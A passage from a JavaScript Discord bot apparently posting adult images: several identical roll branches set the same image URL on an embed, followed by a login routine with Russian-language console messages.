   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 36)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 37)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 38)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 39)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 40)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 41)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
if(roll === 42)
   hentai.setImage('https://cdn.discordapp.com/attachments/605450580625719316/605456918361800712/e4eb3.jpg')
	return message.channel.send(hentai)
}
}
})
};
	bot.login(bot.token)
		.then(() => {
			console.log(`[CONNECTED SUCCESSFULLY]>>>[token- ${bot.user.tag} ]`)
			
		}, err => {
			console.log('Не удалось загрузить токен ')
			console.log(err)
			console.log('Все хорошо, пока процесс завершается.')
			bot.destroy()
		})

	

